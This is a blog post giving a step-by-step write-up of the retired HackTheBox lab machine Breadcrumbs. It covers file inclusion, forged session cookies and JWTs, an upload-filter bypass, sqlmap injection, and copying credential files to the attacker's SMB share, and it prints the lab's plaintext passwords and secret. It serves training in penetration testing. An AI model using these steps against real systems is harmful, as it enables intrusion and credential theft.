@@ -1,0 +1,1321 @@
+<!DOCTYPE html><html lang="en-us" >
+
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  
+  
+  
+    <meta name="generator" content="Wowchemy 5.0.0-beta.3 for Hugo" />
+  
+
+  
+
+  
+  
+
+  
+  
+  
+  
+  
+    
+    
+    
+  
+  
+
+  <meta name="author" content="Mohamed Elleuch" />
+
+  
+  
+  
+    
+  
+  <meta name="description" content="Here&#39;s my writeup for the RETIRED machine Breadcrumbs, Which is an hard Windows machine!" />
+
+  
+  <link rel="alternate" hreflang="en-us" href="https://mohamed-elleuch.me/writeups/htb-breadcrumbs/" />
+
+  
+
+
+
+
+
+
+
+  
+
+
+
+
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  
+
+  
+  
+  
+    <meta name="theme-color" content="#1565c0" />
+  
+
+  
+  
+
+  
+  
+  
+  
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/academicons/1.9.0/css/academicons.min.css" integrity="sha512-W4yqoT1+8NLkinBLBZko+dFB2ZbHsYLDdr50VElllRcNt2Q4/GSs6u71UHKxB7S6JEMCp5Ve4xjh3eGQl/HRvg==" crossorigin="anonymous">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.14.0/css/all.min.css" integrity="sha256-FMvZuGapsJLjouA6k7Eo2lusoAX9i0ShlWFG6qt7SLc=" crossorigin="anonymous">
+
+    
+    
+
+    
+    
+    
+      
+    
+    
+      
+      
+        
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/github.min.css" crossorigin="anonymous" title="hl-light" media="print" onload="this.media='all'">
+          <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/styles/dracula.min.css" crossorigin="anonymous" title="hl-dark" media="print" onload="this.media='all'" disabled>
+        
+      
+    
+
+    
+    
+    
+      <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.min.css" integrity="sha512-1xoFisiGdy9nvho8EgXuXvnpR5GAMSjFwp40gSRE3NwdUdIMIKuPa7bqoUhLD0O/5tPNhteAsE5XyyMi5reQVA==" crossorigin="anonymous" media="print" onload="this.media='all'">
+    
+
+    
+
+    
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/lazysizes/5.2.2/lazysizes.min.js" integrity="sha512-TmDwFLhg3UA4ZG0Eb4MIyT1O1Mb+Oww5kFG0uHqXsdbyZz9DcvYQhKpGgNkamAI6h2lGGZq2X8ftOJvF/XjTUg==" crossorigin="anonymous" async></script>
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+        
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+      
+      
+
+      
+      
+
+      
+    
+  
+
+  
+  
+  
+    
+      
+      <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap">
+      <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&family=Roboto+Mono&family=Roboto:wght@400;700&display=swap" media="print" onload="this.media='all'">
+    
+  
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="/css/wowchemy.8028d170b3ecf9438246932e1cbcdf6c.css" />
+
+  
+
+
+
+  
+
+  
+
+
+  
+  
+  
+
+  
+
+  
+    <link rel="manifest" href="/index.webmanifest" />
+  
+
+  <link rel="icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_32x32_fill_lanczos_center_2.png" />
+  <link rel="apple-touch-icon" type="image/png" href="/images/icon_hu69b6a0d933f031dfe27449e0ead5af37_9293_180x180_fill_lanczos_center_2.png" />
+
+  <link rel="canonical" href="https://mohamed-elleuch.me/writeups/htb-breadcrumbs/" />
+
+  
+  
+  
+  
+  
+  
+  
+    
+  
+  
+  <meta property="twitter:card" content="summary_large_image" />
+  
+  <meta property="og:site_name" content="Mohamed ELLEUCH" />
+  <meta property="og:url" content="https://mohamed-elleuch.me/writeups/htb-breadcrumbs/" />
+  <meta property="og:title" content="HackTheBox - Breadcrumbs Writeup | Mohamed ELLEUCH" />
+  <meta property="og:description" content="Here&#39;s my writeup for the RETIRED machine Breadcrumbs, Which is an hard Windows machine!" /><meta property="og:image" content="https://mohamed-elleuch.me/writeups/htb-breadcrumbs/featured.png" />
+    <meta property="twitter:image" content="https://mohamed-elleuch.me/writeups/htb-breadcrumbs/featured.png" /><meta property="og:locale" content="en-us" />
+  
+    
+      <meta
+        property="article:published_time"
+        content="2021-07-17T00:00:00&#43;00:00"
+      />
+    
+    <meta property="article:modified_time" content="2021-07-17T00:00:00&#43;00:00">
+  
+
+  
+
+
+
+  
+
+  
+
+  
+
+
+
+
+
+  <title>HackTheBox - Breadcrumbs Writeup | Mohamed ELLEUCH</title>
+</head>
+
+
+<body id="top" data-spy="scroll" data-offset="70" data-target="#TableOfContents" class="page-wrapper  ">
+
+  
+  
+  
+  
+  
+  
+  
+  
+  <script src="/js/wowchemy-init.min.76abe0ff166961e9adc403995f18189f.js"></script>
+
+  
+
+
+<aside class="search-modal" id="search">
+  <div class="container">
+    <section class="search-header">
+
+      <div class="row no-gutters justify-content-between mb-3">
+        <div class="col-6">
+          <h1>Search</h1>
+        </div>
+        <div class="col-6 col-search-close">
+          <a class="js-search" href="#" aria-label="Close"><i class="fas fa-times-circle text-muted" aria-hidden="true"></i></a>
+        </div>
+      </div>
+
+      <div id="search-box">
+        
+        <input name="q" id="search-query" placeholder="Search..." autocapitalize="off"
+        autocomplete="off" autocorrect="off" spellcheck="false" type="search" class="form-control"
+        aria-label="Search...">
+        
+      </div>
+
+      
+      
+
+      
+
+    </section>
+    <section class="section-search-results">
+
+      <div id="search-hits">
+        
+      </div>
+
+    </section>
+  </div>
+</aside>
+
+
+
+  <div class="page-header">
+    
+
+
+
+
+
+
+
+
+
+
+
+
+<nav class="navbar navbar-expand-lg navbar-light compensate-for-scrollbar" id="navbar-main">
+  <div class="container-xl">
+
+    
+    <div class="d-none d-lg-inline-flex">
+      <a class="navbar-brand" href="/">Mohamed ELLEUCH</a>
+    </div>
+    
+
+    
+    <button type="button" class="navbar-toggler" data-toggle="collapse"
+            data-target="#navbar-content" aria-controls="navbar" aria-expanded="false" aria-label="Toggle navigation">
+    <span><i class="fas fa-bars"></i></span>
+    </button>
+    
+
+    
+    <div class="navbar-brand-mobile-wrapper d-inline-flex d-lg-none">
+      <a class="navbar-brand" href="/">Mohamed ELLEUCH</a>
+    </div>
+    
+
+    
+    
+    <div class="navbar-collapse main-menu-item collapse justify-content-start" id="navbar-content">
+
+      
+      <ul class="navbar-nav d-md-inline-flex">
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#about"><span>Home</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#posts"><span>Writeups</span></a>
+        </li>
+
+        
+        
+
+        
+
+        
+        
+        
+          
+        
+
+        
+
+        
+        
+        
+        
+
+        
+          
+            
+            
+          
+          
+            
+            
+            
+              
+            
+            
+          
+        
+
+        <li class="nav-item">
+          <a class="nav-link " href="/#contact"><span>Contact</span></a>
+        </li>
+
+        
+        
+
+      
+
+        
+      </ul>
+    </div>
+
+    <ul class="nav-icons navbar-nav flex-row ml-auto d-flex pl-md-2">
+
+      
+      
+        
+      
+
+      
+      
+      <li class="nav-item">
+        <a class="nav-link js-search" href="#" aria-label="Search"><i class="fas fa-search" aria-hidden="true"></i></a>
+      </li>
+      
+
+      
+      
+      <li class="nav-item dropdown theme-dropdown">
+        <a href="#" class="nav-link" data-toggle="dropdown" aria-haspopup="true" aria-label="Display preferences">
+          <i class="fas fa-moon" aria-hidden="true"></i>
+        </a>
+        <div class="dropdown-menu">
+          <a href="#" class="dropdown-item js-set-theme-light">
+            <span>Light</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-dark">
+            <span>Dark</span>
+          </a>
+          <a href="#" class="dropdown-item js-set-theme-auto">
+            <span>Automatic</span>
+          </a>
+        </div>
+      </li>
+      
+
+      
+
+    </ul>
+
+  </div>
+</nav>
+
+
+  </div>
+
+  <div class="page-body">
+    <article class="article">
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+
+
+<div class="article-container pt-3">
+  <h1>HackTheBox - Breadcrumbs Writeup</h1>
+
+  
+  <p class="page-subtitle">Here&rsquo;s my writeup for the RETIRED machine Breadcrumbs, Which is a hard Windows machine!</p>
+  
+
+  
+
+
+<div class="article-metadata">
+
+  
+  
+  
+  
+  <div>
+    
+
+  <span class="author-highlighted">
+      Mohamed Elleuch</span>
+  </div>
+  
+  
+
+  
+  <span class="article-date">
+    
+    
+      
+    
+    Jul 17, 2021
+  </span>
+  
+
+  
+
+  
+
+  
+  
+  
+  
+  
+  
+
+  
+  
+
+</div>
+
+  
+
+
+
+
+
+</div>
+
+
+<div class="article-header container featured-image-wrapper mt-4 mb-4" style="max-width: 589px; max-height: 334px;">
+  <div style="position: relative">
+    <img src="/writeups/htb-breadcrumbs/featured.png" alt="" class="featured-image">
+    <span class="article-header-caption">Image credit: [<strong>HackTheBox</strong>]</span>
+  </div>
+</div>
+
+
+
+  <div class="article-container">
+
+    <div class="article-style">
+      <h1 id="p-stylecolorredinformation-gathering-p"><p style="color:RED">Information Gathering </p></h1>
+<hr>
+<h2 id="p-stylecolorgreennmap-scan-p"><p style="color:Green">Nmap scan </p></h2>
+<pre><code class="language-bash">sudo nmap -sC -sV 10.10.10.228 -v
+</code></pre>
+<pre><code class="language-bash">22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 9d:d0:b8:81:55:54:ea:0f:89:b1:10:32:33:6a:a7:8f (RSA)
+|   256 1f:2e:67:37:1a:b8:91:1d:5c:31:59:c7:c6:df:14:1d (ECDSA)
+|_  256 30:9e:5d:12:e3:c6:b7:c6:3b:7e:1e:e7:89:7e:83:e4 (ED25519)
+80/tcp   open  http          Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1h PHP/8.0.1
+|_http-title: Library
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+443/tcp  open  ssl/http      Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1h PHP/8.0.1)
+</code></pre>
+<p>We have 6 ports open:</p>
+<ul>
+<li>SSH</li>
+<li>Webserver 80/443</li>
+<li>SMB</li>
+</ul>
+<hr>
+<h2 id="p-stylecolorgreenweb-enumeration-p"><p style="color:Green">Web Enumeration </p></h2>
+<p>Let&rsquo;s take a loot at both ports 80/443, but seems they both give us the same pages! We can work one of these</p>
+<img src="e-book.png">
+<p>Seems like it&rsquo;s an e-book library</p>
+<img src="eth.png">
+<p>We have a search page for books, let&rsquo;s try to play with it a bit</p>
+<img src="ethtest.png">
+<p>I tried few manual enumeration but nothing seem to give me an interesting output!</p>
+<p>Let&rsquo;s capture the request with burpsuite to see what&rsquo;s actually going on</p>
+ <img src="LFI1.png">
+<p>Aside from the title and author parameters we have &ldquo;method=0&rdquo; which seems odd</p>
+<p>Let&rsquo;s first send the request to repeater and change &ldquo;method=1&rdquo;</p>
+ <img src="LFI21.png">
+ <img src="LFI22.png">
+<p>We get a different and an interesting response which screams &ldquo;local file inclusion&rdquo; that also leaks the parameter &ldquo;book&rdquo;, let&rsquo;s check if that works</p>
+ <img src="LFI3.png">
+<p>And yes! We have an LFI, let&rsquo;s keep enumerating we don&rsquo;t really have anything interesting to read yet</p>
+<pre><code class="language-bash">gobuster dir -u http://10.10.10.228/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x asp,aspx,php
+
+</code></pre>
+<blockquote>
+<p>-x prefix for adding extensions when fuzzing , since we&rsquo;re working on windows box we may find asp/x files
+Also chose the lowercase version of raft-directories because windows is key sensitive,</p>
+</blockquote>
+<img src="gob.png">
+<p>Seems like we have a login panel</p>
+<img src="login.png">
+<p>Since we&rsquo;re looking for files to read we&rsquo;re not gonna try to do stuff with the login panel! Let&rsquo;s run gobuster again</p>
+<pre><code class="language-bash">gobuster dir -u http://10.10.10.228/portal -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -x asp,aspx,php
+</code></pre>
+<img src="gob1.png">
+Let's check all of these
+<p><code>/includes/</code>
+<img src="include.png"></p>
+<p><code>/php/</code>
+<img src="files.png"></p>
+<img src="users.png">
+Here we have a list of users, Let's take note of them first and save them somewhere in case we needed users later
+<hr>
+<h1 id="p-stylecolorredfoothold-p"><p style="color:RED">Foothold </p></h1>
+<hr>
+<p>Let&rsquo;s not waste more time and check the files under /includes/ and also the cookie.php under /portal/ with our LFI</p>
+<p><code>include/fileController.php</code></p>
+<img src="filecont.png">
+<p>We get the JWT secret</p>
+<pre><code>$secret_key = '6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e'
+</code></pre>
+<p>Another interesting thing in the response</p>
+<pre><code>if(in_array($user, $admins) &amp;&amp; $_SESSION['username'] == \&quot;paul\&quot;)
+</code></pre>
+<p>Seems like we need to login as the user paul</p>
+<p>Let&rsquo;s check <code>Cookie.php</code>
+<img src="cookie.png"></p>
+<p>If we clean the response, a quick sed to remove the &ldquo;\r \n and &quot;</p>
+<pre><code>&lt;?php
+/** * @param string $username  Username requesting session cookie * 
+* @return string $session_cookie Returns the generated cookie *
+* @devteam * Please DO NOT use default PHPSESSID; our security team says they are predictable. 
+*CHANGE SECOND PART OF MD5 KEY EVERY WEEK **/
+
+  function makesession($username){    
+  	$max = ;    
+  	$seed = rand(0, $max);    
+  	$key = &quot;s4lTy_stR1nG_&quot;.$username[$seed].&quot;(!528./9890&quot;;    
+  	$session_cookie = $username.md5($key);    
+  	return $session_cookie;}
+
+?&gt;
+</code></pre>
+<p>We know that the user is &ldquo;paul&rdquo; which is a short username, we can generate all the possible cookies and try them until one works</p>
+<pre><code>&lt;?php
+$user=&quot;paul&quot;;
+for ($seed = 0; $seed &lt;= strlen($user) - 1; $seed++) {
+	$key = &quot;s4lTy_stR1nG_&quot;.$user[$seed].&quot;(!528./9890&quot;;  
+	$session_cookie = $user.md5($key);
+	echo &quot;[+] Cookie : &quot;.$session_cookie.&quot;\n&quot;;
+  
+};
+?&gt;
+</code></pre>
+<img src="cok.png">
+<p>Let&rsquo;s try them one by one and check if we can get in</p>
+<img src="adm1.png">
+<img src="adm.png">
+<p>And we&rsquo;re in!</p>
+<p>Nothing interesting in the Issues page</p>
+<img src="Issues.png">
+<p>Let&rsquo;s check the File management page</p>
+<img src="file.png">
+<p>Let&rsquo;s try to upload anything to see if it works</p>
+<img src="token.png">
+<p>Seems like we need a token! We have the secret, but we forgot to check what data we should provide!
+Let&rsquo;s check the response back</p>
+<pre><code>$ret = JWT::decode($jwt, $secret_key, array('HS256')); 
+return $ret;
+if($_SERVER['REQUEST_METHOD'] === \&quot;POST\&quot;){
+  $admins = array(\&quot;paul\&quot;);
+  $user = validate()-&gt;data-&gt;username;
+</code></pre>
+<p>According to this response the content of JWT token should be</p>
+<pre><code>{&quot;data&quot;:{&quot;username&quot;:&quot;paul&quot;}}
+</code></pre>
+<p>Now we have everything we need let&rsquo;s forge our token, we can either use python or jwt.io</p>
+<img src="jwt.png">
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI
+</code></pre>
+<p>Let&rsquo;s add the cookie to our browser</p>
+<img src="newjwt.png">
+<p>Let&rsquo;s to import anything</p>
+<img src="succ.png">
+<p>It worked!</p>
+<p>As the page mentions, we can only upload .zip files, after few attempts it seems that it&rsquo;s client-side filter that checks the content type</p>
+<p>we can bypass it by simply capturing the request with burp and change the &ldquo;Content-Type&rdquo; Header to application/zip</p>
+<img src="foothold.png">
+<p>And we&rsquo;re in</p>
+<hr>
+<h1 id="p-stylecolorredjuliette-user-privesc-p"><p style="color:RED">Juliette User PrivESC </p></h1>
+<hr>
+<p>As usual, before running any enumeration tool we can check the webpage source to see if something is hidden there!</p>
+<p>We can see an interesting folder under the /portal/</p>
+<img src="data.png">
+<img src="userdata.png">
+<p>We have few files for users,
+Let&rsquo;s check if they contains any password</p>
+<pre><code>Get-ChildItem | Select-String 'password'
+</code></pre>
+<img src="userflag.png">
+<p>And we get creds for user juliette</p>
+<pre><code>juliette:jUli901./())!
+</code></pre>
+<p>Let&rsquo;s try to ssh into the box with these creds</p>
+<img src="userf.png">
+<hr>
+<h1 id="p-stylecolorreddevelopment-user-privesc-p"><p style="color:RED">Development User PrivESC </p></h1>
+<hr>
+<p>In juliette&rsquo;s Desktop we can find an interesting file <code>todo.html</code></p>
+<img src="todo1.png">
+<img src="todo2.png">
+<p>Seems like we need to get the passwords that are stored in the stickynotes! According to google they should located under the %appdata% folder</p>
+<pre><code>Get-ChildItem *Sticky* -Recurse
+</code></pre>
+<img src="sticky.png">
+<p>We found a directory!</p>
+<pre><code>C:\users\juliette\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\
+</code></pre>
+<p>It contains more folders, the \LocalState\ seems interesting!
+<img src="state.png">
+Let&rsquo;s copy these files to our machine!
+Fist we start our smbserver</p>
+<pre><code>python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.6 -smb2support euch .
+</code></pre>
+<p>and copy these files!</p>
+<pre><code>copy * \\10.10.14.6\euch
+</code></pre>
+<img src="smb.png">
+<p>Let&rsquo;s check the files! the only interesting file we need is <code>plum.sqlite-wal</code></p>
+<p>It contains  the creds for the development user</p>
+<pre><code>\id=fc0d8d70-055d-4870-a5de-d76943a68ea2 development: fN3)sN5Ee@g
+
+</code></pre>
+<p>Let&rsquo;s try to ssh with these creds
+<img src="sshdev.png"></p>
+<hr>
+<h1 id="p-stylecolorredroot-user-privesc-p"><p style="color:RED">Root User PrivESC </p></h1>
+<hr>
+<p>Now we&rsquo;re logged in as development, we can check what&rsquo;s inside <code>C:\Development\</code></p>
+<img src="ff.png">
+<p>Let&rsquo;s copy it to our machine</p>
+<pre><code>copy Krypter_Linux \\10.10.14.6\euch
+
+</code></pre>
+<img src="kryp.png">
+It's a Linux executable, before going deeper in the binary it's better to run strings or rabin2 -z to extract the printable strings in the binary!
+<img src="rabin.png">
+<p>What seems odd when you see the output is the port 1234!</p>
+<pre><code>http://passmanager.htb:1234/index.php
+</code></pre>
+<p>Also we have the GET parameters</p>
+<pre><code>method=select&amp;username=administrator&amp;table=passwords
+</code></pre>
+<p>Seems like it&rsquo;s running locally!</p>
+<img src="local.png">
+<p>Let&rsquo;s forward it to our machine with ssh</p>
+<pre><code>ssh -L 1234:127.0.0.1:1234 development@10.10.10.228
+</code></pre>
+<img src="for.png">
+<p>The parameters names gives us a hint that it&rsquo;s SQL injection
+let&rsquo;s use sqlmap</p>
+<pre><code>sqlmap -u &quot;http://127.0.0.1:1234/?method=select&amp;username=administrator&amp;table=passwords&quot; --dump
+</code></pre>
+<img src="us.png">
+<img src="AES.png">
+<p>We get the administrator&rsquo;s password but it&rsquo;s encrypted (AES)</p>
+<p>Let&rsquo;s use cyberchef to decrypt it</p>
+<img src="root.png">
+<blockquote>
+<p>When i first did the machine, I overthinked this part,  I thought that i needed to to find IV somewhere in the machine <Wasted a lot of time trying to find it></p>
+</blockquote>
+<p>And now let&rsquo;s try to ssh into the box as the administrator and grab the flag!</p>
+<img src="rooted.png">
+<h2 id="thanks-for-reading-hope-you-enjoyed-it">Thanks for reading hope you enjoyed it!</h2>
+
+    </div>
+
+    
+
+
+
+
+
+
+<div class="article-tags">
+  
+  <a class="badge badge-light" href="/tag/hackthebox/">HackTheBox</a>
+  
+</div>
+
+
+
+<div class="share-box" aria-hidden="true">
+  <ul class="share">
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://twitter.com/intent/tweet?url=https://mohamed-elleuch.me/writeups/htb-breadcrumbs/&amp;text=HackTheBox%20-%20Breadcrumbs%20Writeup" target="_blank" rel="noopener" class="share-btn-twitter">
+          <i class="fab fa-twitter"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.facebook.com/sharer.php?u=https://mohamed-elleuch.me/writeups/htb-breadcrumbs/&amp;t=HackTheBox%20-%20Breadcrumbs%20Writeup" target="_blank" rel="noopener" class="share-btn-facebook">
+          <i class="fab fa-facebook"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="mailto:?subject=HackTheBox%20-%20Breadcrumbs%20Writeup&amp;body=https://mohamed-elleuch.me/writeups/htb-breadcrumbs/" target="_blank" rel="noopener" class="share-btn-email">
+          <i class="fas fa-envelope"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://www.linkedin.com/shareArticle?url=https://mohamed-elleuch.me/writeups/htb-breadcrumbs/&amp;title=HackTheBox%20-%20Breadcrumbs%20Writeup" target="_blank" rel="noopener" class="share-btn-linkedin">
+          <i class="fab fa-linkedin-in"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="whatsapp://send?text=HackTheBox%20-%20Breadcrumbs%20Writeup%20https://mohamed-elleuch.me/writeups/htb-breadcrumbs/" target="_blank" rel="noopener" class="share-btn-whatsapp">
+          <i class="fab fa-whatsapp"></i>
+        </a>
+      </li>
+    
+      
+      
+      
+        
+      
+      
+      
+      <li>
+        <a href="https://service.weibo.com/share/share.php?url=https://mohamed-elleuch.me/writeups/htb-breadcrumbs/&amp;title=HackTheBox%20-%20Breadcrumbs%20Writeup" target="_blank" rel="noopener" class="share-btn-weibo">
+          <i class="fab fa-weibo"></i>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+
+
+
+  
+  
+  
+    
+  
+  
+  
+  <div class="media author-card content-widget-hr">
+    
+      
+      <a href="https://mohamed-elleuch.me"><img class="avatar mr-3 avatar-circle" src="/authors/admin/avatar_hue00c9bb654a77b295a35ed11380f9182_580950_270x270_fill_q75_lanczos_center.jpg" alt="Mohamed Elleuch"></a>
+    
+
+    <div class="media-body">
+      <h5 class="card-title"><a href="https://mohamed-elleuch.me">Mohamed Elleuch</a></h5>
+      <h6 class="card-subtitle">Cyber Security Enthusiast <br/> ICT Engineering Student</h6>
+      <p class="card-text">Pentester and Red Teamer</p>
+      <ul class="network-icon" aria-hidden="true">
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="/#contact" >
+        <i class="fas fa-envelope"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://twitter.com/medelleuchv1" target="_blank" rel="noopener">
+        <i class="fab fa-twitter"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://github.com/ElleuchX1" target="_blank" rel="noopener">
+        <i class="fab fa-github"></i>
+      </a>
+    </li>
+  
+    
+    
+    
+      
+    
+    
+    
+    
+    
+      
+    
+    <li>
+      <a href="https://www.linkedin.com/in/medelleuch" target="_blank" rel="noopener">
+        <i class="fab fa-linkedin"></i>
+      </a>
+    </li>
+  
+</ul>
+
+    </div>
+  </div>
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  </div>
+</article>
+  </div>
+
+  <div class="page-footer">
+    
+    
+    <div class="container">
+      <footer class="site-footer">
+  
+
+  <p class="powered-by">
+    Copyright © Mohamed Elleuch 2021
+  </p>
+
+  
+  
+
+
+
+
+
+
+  <p class="powered-by">
+    
+    
+    
+    Published with
+    <a href="https://wowchemy.com/?utm_campaign=poweredby" target="_blank" rel="noopener">Wowchemy</a>  —
+    the free, <a href="https://github.com/wowchemy/wowchemy-hugo-modules" target="_blank" rel="noopener">
+    open source</a> website builder that empowers creators.
+    
+  </p>
+</footer>
+
+    </div>
+    
+  </div>
+
+  
+<div id="modal" class="modal fade" role="dialog">
+  <div class="modal-dialog">
+    <div class="modal-content">
+      <div class="modal-header">
+        <h5 class="modal-title">Cite</h5>
+        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body">
+        <pre><code class="tex hljs"></code></pre>
+      </div>
+      <div class="modal-footer">
+        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
+          <i class="fas fa-copy"></i> Copy
+        </a>
+        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
+          <i class="fas fa-download"></i> Download
+        </a>
+        <div id="modal-error"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+      
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/instant.page/5.1.0/instantpage.min.js" integrity="sha512-1+qUtKoh9XZW7j+6LhRMAyOrgSQKenQ4mluTR+cvxXjP1Z54RxZuzstR/H9kgPXQsVB8IW7DMDFUJpzLjvhGSQ==" crossorigin="anonymous"></script>
+
+      
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
+      
+
+      
+      
+
+      
+
+      
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/highlight.min.js" integrity="sha512-TDKKr+IvoqZnPzc3l35hdjpHD0m+b2EC2SrLEgKDRWpxf2rFCxemkgvJ5kfU48ip+Y+m2XVKyOCD85ybtlZDmw==" crossorigin="anonymous"></script>
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.0/languages/r.min.js"></script>
+        
+      
+
+    
+
+    
+    
+    
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.min.js" integrity="sha512-SeiQaaDh73yrb56sTW/RgVdi/mMqNeM2oBwubFHagc5BkixSpP1fvqF47mKzPGWYSSy4RwbBunrJBQ4Co8fRWA==" crossorigin="anonymous"></script>
+    
+
+    
+    
+
+    
+    
+    
+      
+      <script id="search-hit-fuse-template" type="text/x-template">
+        <div class="search-hit" id="summary-{{key}}">
+          <div class="search-hit-content">
+            <div class="search-hit-name">
+              <a href="{{relpermalink}}">{{title}}</a>
+              <div class="article-metadata search-hit-type">{{type}}</div>
+              <p class="search-hit-description">{{snippet}}</p>
+            </div>
+          </div>
+        </div>
+      </script>
+      
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
+      
+    
+
+    
+    
+
+    
+    
+    
+    
+
+    <script src="/js/_vendor/bootstrap.bundle.min.f81d0a1705048649befc8b595e455a94.js"></script>
+
+    
+    
+      
+      
+      
+      
+      
+      
+      
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+      
+      
+    
+    
+    <script src="/en/js/wowchemy.min.a10ad2a6b25aea7a22d6392d483b454d.js"></script>
+
+    
+
+
+
+
+
+
+</body>
+</html>
